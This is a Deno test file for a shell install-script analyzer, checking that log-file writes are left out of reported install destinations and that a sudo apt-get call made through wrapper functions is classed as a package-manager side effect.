Deno.test("log-file writes are omitted from installs and Also writes", async () => {
  assertEquals(isLogWriteDestination("$LOG_FILE"), true);
  assertEquals(isLogWriteDestination('"$STEP_LOG"'), true);
  assertEquals(isLogWriteDestination("$WORK_DIR/install.log"), true);
  assertEquals(isLogWriteDestination("/var/log/syslog"), true);
  assertEquals(isLogWriteDestination("/var/logs/daemon"), true);
  assertEquals(isLogWriteDestination("$logfile"), true);
  assertEquals(isLogWriteDestination("$stepLog"), true);
  assertEquals(isLogWriteDestination("$CATALOG"), false);
  assertEquals(isLogWriteDestination("$LOGICAL_PATH"), false);
  assertEquals(isLogWriteDestination("$LOGNAME"), false);
  assertEquals(isLogWriteDestination("$PREFIX/bin/logtool"), false);
  assertEquals(isLogWriteDestination("$HOME/.bashrc"), false);
  assertEquals(isLogWriteDestination("$STATUS_FILE"), false);

  const report = await analyze(`
    LOG_FILE=/tmp/install.log
    STEP_LOG=/tmp/step.log
    echo a >> "$LOG_FILE"
    echo b >> "$STEP_LOG"
    echo c >> /var/log/syslog
    echo d >> "$HOME/.bashrc"
    echo e > "$STATUS_FILE"
    echo f > "$WORK_DIR/bootstrap.sha256"
    echo g > "$CATALOG"
    tee -a "$LOG_FILE" "$HOME/.profile"
    install -m 755 ./tool "$PREFIX/bin/logtool"
  `);
  const destinations = report.installs.map((fact) => fact.destination);
  assert(destinations.every((dest) => !isLogWriteDestination(dest)));
  assert(destinations.some((dest) => dest.includes(".bashrc")));
  assert(destinations.some((dest) => dest.includes(".profile")));
  assert(destinations.some((dest) => dest.includes("STATUS_FILE")));
  assert(destinations.some((dest) => dest.includes("bootstrap.sha256")));
  assert(destinations.some((dest) => dest.includes("CATALOG")));
  assert(destinations.some((dest) => dest.includes("logtool")));
  const text = report.summary.sentences.join("\n");
  assert(!text.includes("LOG_FILE"));
  assert(!text.includes("STEP_LOG"));
  assert(!text.includes("/var/log"));
  assert(text.includes("Also writes"));
  assert(text.includes("STATUS_FILE"));

  const logsOnly = await analyze('echo hi >> "$LOG_FILE"\n');
  assertEquals(logsOnly.installs, []);
  assertEquals(logsOnly.summary.risk, "info");
  assert(
    logsOnly.summary.sentences.some((sentence) =>
      sentence.includes("No install destination")
    ),
  );
});

Deno.test("run_root apt-get is a package-manager side effect", async () => {
  const report = await analyze(`
    run() { "$@"; }
    run_root() {
      step=$1
      shift
      run "$step" sudo "$@"
    }
    run_root "Install packages" apt-get install -y curl
    run echo apt-get
  `);
  const managers = report.sideEffects.filter((fact) =>
    fact.kind === "package-manager"
  );
  assertEquals(managers.length, 1);
  assertStringIncludes(managers[0]!.detail, "apt-get install -y curl");
  assert(!managers[0]!.detail.includes("echo apt-get"));
  assertEquals(report.summary.risk, "medium");
});
